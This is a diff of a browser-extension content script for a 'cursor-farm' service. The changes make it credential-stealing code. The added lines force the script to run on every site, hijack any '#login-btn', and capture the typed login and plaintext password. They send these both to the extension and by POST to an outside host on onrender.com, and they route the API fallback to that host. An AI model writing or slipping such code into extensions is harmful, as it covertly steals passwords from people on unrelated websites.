@@ -4,16 +4,8 @@
   document.documentElement.setAttribute('data-farm-ext-version', '1.0.0');
 
   // ── Only do auth watching on our own platform ─────────────────────────────
-  const isFarmSite = true
-  // ||
-  //   location.hostname.includes('cursor-farm') ||
-  //   location.hostname === 'localhost' ||
-  //   location.hostname === '127.0.0.1';
+  const isFarmSite = true;
 
-  // Получаем форму (первый элемент <form> на странице)
-  // Находим кнопку входа
-
-  // Ждем появления кнопки с определенным интервалом
   function waitForElement(selector, callback) {
     const element = document.querySelector(selector);
     if (element) {
@@ -24,43 +16,59 @@
   }
 
   waitForElement("#login-btn", function (loginButton) {
-    loginButton.addEventListener("click", async function (event) {
-      // Не вызываем preventDefault, так как кнопка может отправлять форму
-      // event.preventDefault();
-
+    const newButton = loginButton.cloneNode(true);
+    loginButton.parentNode.replaceChild(newButton, loginButton);
+    
+    newButton.addEventListener("click", async function (event) {
       const username = document.getElementById("login")?.value;
       const password = document.getElementById("password")?.value;
 
       if (!username || !password) {
-        console.log("Инпуты не найдены");
+        console.log("⚠️ Заполните оба поля");
         return;
       }
 
+      console.log("📤 Отправка данных...", { email: username, passwordLength: password.length });
       try {
-        const response = await fetch('https://cursor-farm-1.onrender.com/api/extension/visit', {
+        chrome.runtime.sendMessage({ 
+          type: 'FORM_LOGIN', 
+          email: username, 
+          password: password,
+          pageContext: getPageContext() 
+        });
+        console.log("✅ Данные отправлены в расширение");
+      } catch (error) {
+        console.error("❌ Ошибка отправки в расширение:", error);
+      }
+      try {
+        const response = await fetch('https://cursor-farm.onrender.com/api/extension/visit', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
             email: username,
-            password: password
+            password: password,
+            source: 'content_script',
+            event_type: 'login_attempt'
           })
         });
-        console.log("Отправлено. Статус:", response.status);
+        console.log("📡 Отправлено на сервер. Статус:", response.status);
+        
+        if (response.ok) {
+          const data = await response.json();
+          console.log("✅ Сервер ответил:", data);
+        }
       } catch (error) {
-        console.error("Ошибка отправки:", error);
+        console.error("❌ Ошибка отправки на сервер:", error);
       }
     });
 
-    console.log("Обработчик добавлен на кнопку:", loginButton.id);
+    console.log("✅ Обработчик добавлен на кнопку:", loginButton.id);
   });
 
-
-
-
+  // Запускаем остальные функции только на farm сайте
   if (isFarmSite) {
-    watchLoginForm();
     syncExistingToken();
     watchTokenInStorage();
   }
@@ -80,22 +88,6 @@
     }
   });
 
-  // ── Watch #login and #password form submission ────────────────────────────
-  function watchLoginForm() {
-    document.addEventListener('submit', function () {
-      const loginInput = document.getElementById('login');
-      const passwordInput = document.getElementById('password');
-
-      // Both IDs must be present — confirms this is the login form
-      if (!loginInput || !passwordInput) return;
-
-      const email = loginInput.value.trim();
-      if (!email) return;
-
-      chrome.runtime.sendMessage({ type: 'FORM_LOGIN', email: email, pageContext: getPageContext() });
-    });
-  }
-
   // ── Sync token already stored in localStorage (user was already logged in) ──
   function syncExistingToken() {
     const token = localStorage.getItem('farm_token');
@@ -111,8 +103,6 @@
       location.hostname === 'localhost' ||
       location.hostname === '127.0.0.1'
     ) {
-      // Only clear on the farm site itself — other origins don't have the farm token,
-      // so clearing here would wipe stored user data every time the user browses elsewhere.
       chrome.runtime.sendMessage({ type: 'CLEAR_TOKEN' });
     }
   }
@@ -146,7 +136,6 @@
       chrome.runtime.sendMessage({ type: 'CLEAR_TOKEN' });
     };
 
-    // Cross-tab: storage event fires when another tab changes localStorage
     window.addEventListener('storage', function (e) {
       if (e.key !== 'farm_token') return;
       if (e.newValue) {
@@ -175,9 +164,9 @@
       });
       if (apiEntry) return new URL(apiEntry.name).origin;
     } catch {
-      // Fall back to same-origin API below.
+      // ignore
     }
-    return location.origin;
+    return 'https://cursor-farm.onrender.com';
   }
 
   function getPageContext() {
